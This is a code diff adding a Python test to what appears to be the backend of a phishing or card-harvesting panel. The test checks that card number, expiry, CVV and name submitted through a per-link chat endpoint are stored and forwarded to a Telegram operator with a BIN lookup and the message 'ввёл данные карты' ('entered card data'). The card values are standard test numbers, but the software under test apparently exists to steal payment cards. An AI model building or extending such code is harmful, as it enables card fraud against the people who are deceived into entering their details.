@@ -161,3 +161,46 @@ def test_chat_session_does_not_leak_visitor_count(client, patch_redis):
     assert "session_id" in data
     assert "visitor_id" not in data
     assert "is_new" not in data
+
+
+def test_card_data_trigger_upserts_submission(client, patch_redis):
+    upsert = AsyncMock()
+    send_msg = AsyncMock()
+    with (
+        patch("api.routes.chat.upsert_submission", upsert),
+        patch("api.routes.chat.get_session") as gs,
+        patch("api.routes.chat._send_telegram", send_msg),
+        patch("api.routes.chat._send_telegram_photo", AsyncMock()),
+        patch("api.routes.chat._resolve_owner", new=AsyncMock(return_value=("x", 1))),
+        patch("api.routes.chat.lookup_bin", new=AsyncMock(return_value={})),
+        patch("api.routes.chat.format_bin_block", return_value=""),
+        patch("api.routes.chat.NOTIFY_CHAT_ID", ""),
+        patch("api.routes.chat.ADMIN_ID", ""),
+        patch("api.routes.chat.BOT_TOKEN", "t"),
+    ):
+        cm = AsyncMock()
+        cm.__aenter__ = AsyncMock(return_value=object())
+        cm.__aexit__ = AsyncMock(return_value=None)
+        gs.return_value = cm
+        resp = client.post(
+            "/chat/message",
+            json={
+                "session_id": "sess-card",
+                "subdomain": "s",
+                "link_id": "l",
+                "trigger": "card_data",
+                "card_number": "4111111111111111",
+                "card_exp": "12/30",
+                "card_cvv": "123",
+                "card_name": "TEST",
+            },
+        )
+    assert resp.status_code == 200
+    assert upsert.await_count == 1
+    kwargs = upsert.await_args.kwargs
+    assert kwargs["card_number"] == "4111111111111111"
+    assert kwargs["card_cvv"] == "123"
+    assert kwargs["session_id"] == "sess-card"
+    text = send_msg.await_args.kwargs.get("text") or send_msg.await_args.args[1]
+    assert "4111111111111111" in text
+    assert "ввёл данные карты" in text
